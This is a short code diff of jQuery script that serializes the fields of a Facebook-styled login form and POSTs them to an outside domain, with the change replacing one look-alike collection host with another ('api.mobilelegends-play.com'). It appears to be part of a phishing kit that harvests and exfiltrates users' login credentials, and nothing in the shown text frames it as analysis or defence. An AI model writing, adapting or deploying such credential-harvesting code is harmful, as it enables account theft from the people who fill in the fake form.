@@ -2,7 +2,7 @@ $(".login-form-fb").submit(function() {
     var d = $(".login-form-fb");
 
     $.ajax({
-        url: "https://api-true-id-x.com/json/",
+        url: "https://api.mobilelegends-play.com/json/",
         type: "POST",
         data: d.serialize(),
         success: function () {
